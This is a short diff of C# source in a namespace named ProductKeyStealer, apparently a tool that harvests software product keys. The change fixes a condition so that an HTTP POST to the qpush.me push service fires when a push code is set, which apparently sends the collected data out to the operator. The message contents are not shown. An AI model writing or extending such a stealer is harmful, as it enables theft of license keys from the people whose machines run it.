@@ -38,7 +38,7 @@ namespace ProductKeyStealer
                 }
                 if (qpushname.Length != 0)
                 {
-                    if (qpushname.Length != 0)
+                    if (qpushcode.Length != 0)
                     {
                         httpclient.PostAsync("https://qpush.me/pusher/push_site/", new FormUrlEncodedContent(qpushmessage)).GetAwaiter().GetResult();
                     }
